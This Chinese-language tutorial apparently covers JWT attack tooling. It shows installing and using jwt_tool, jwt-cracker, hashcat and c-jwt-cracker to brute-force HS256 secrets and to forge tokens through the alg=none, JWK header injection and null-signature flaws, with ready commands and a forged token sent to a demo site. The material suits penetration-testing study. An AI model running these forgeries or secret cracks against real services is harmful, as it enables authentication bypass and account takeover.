# jwt_tool

## 一、安装

1、git clone https://github.com/ticarpi/jwt_tool

![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/18449/1670652852022/e29791a7b7074335b92ad74e7f046117.png)

2pip install pycryptodomex

3、cd到安装目录

![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/18449/1670652852022/f162a435a8b246d68ac270b926bbd3e3.png)

4、解密

python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9iaW4iLCJsZXZlbCI6InVzZXIifQ.oYPuxIPnm6lYx3Zx_8zaMGVw7Np5nZtgJVnaMqlZcOQ

![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/18449/1670652852022/3128997abb1c45bd8008d9fc435b0c81.png)

5、爆破密钥

python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9iaW4iLCJsZXZlbCI6InVzZXIifQ.oYPuxIPnm6lYx3Zx_8zaMGVw7Np5nZtgJVnaMqlZcOQ  -C  -d jwt-common.txt

## 二、漏洞利用

**1.签名算法可被修改为none(CVE-2015-9235)**

使用jwt_too进行攻击（该工具适用于不改变原有payload的数据的基础上而没有签名算法获得的token)

python3 jwt_tool.py    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvZGVtby5zam9lcmRsYW5na2VtcGVyLm5sXC8iLCJpYXQiOjE2NjI3Mzc5NjUsImV4cCI6MTY2MjczOTE2NSwiZGF0YSI6eyJoZWxsbyI6IndvcmxkIn19.LlHtXxVQkjLvW8cN_8Kb3TerEEPm2-rAfnwZ_h0pZBg  -X a

![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/18449/1670652852022/1b930cde18a6412cb17e4e5b46d8faeb.png)

得到签名算法为none/NONE/None/nOnE认证的token

eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJodHRwczovL2RlbW8uc2pvZXJkbGFuZ2tlbXBlci5ubC8iLCJpYXQiOjE2NjI3Mzc5NjUsImV4cCI6MTY2MjczOTE2NSwiZGF0YSI6eyJoZWxsbyI6IndvcmxkIn19.

使用得到的token 进行认证请求

[http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php](http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php)

![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/18449/1670652852022/0630e771e98a4c40895a9cf290f04740.png)

**2、JWKS公钥 注入 ——伪造密钥(CVE-2018-0114)**

jwk是header里的一个参数，用于指出密钥，存在被伪造的风险。
攻击者可以通过以下方法来伪造JWT：删除原始签名，向标头添加新的公钥，然后使用与该公钥关联的私钥进行签名。

python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw      -X i

![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/18449/1670652852022/f55c2e2a98f74ab68002141bc24c246a.png)

**3、空签名(CVE-2020-28042)**

从令牌末尾删除签名

python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw         -X n

![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/18449/1670652852022/1b156253090643629320d9c2b9a45070.png)

# jwt-cracker

该工具仅限于单一的签名算法(HS256) ，如果提供了不同的签名算法，则无法进行操作

https://github.com/lmammino/jwt-cracker

![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/18449/1670652852022/9c2bd63fcdc7408083a48cbfe18d2f0d.png)

# hashcat

***kaili自带的爆破工具、Hashcat命令：***

字典攻击： `hashcat -a 0 -m 16500 jwt.txt wordlist.txt`

# c-jwt-cracker

是暴力破解 JWT 私钥的工具。

https://github.com/brendan-rius/c-jwt-cracker

1、使用c-jwt-cracker需要我们在我们linux里安装好openssl头文件。

在linux的配置命令是：apt-get install libssl-dev

2、下载好c-jwt-cracker，还需要我么在工具所在目录执行make命令。目的是让文件makefile运行起来。编译完后会生成一个jwtcrack文件。

make报错解决：

![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/18449/1670652852022/ffb48ef356db4fe18b126a3a5191d398.png)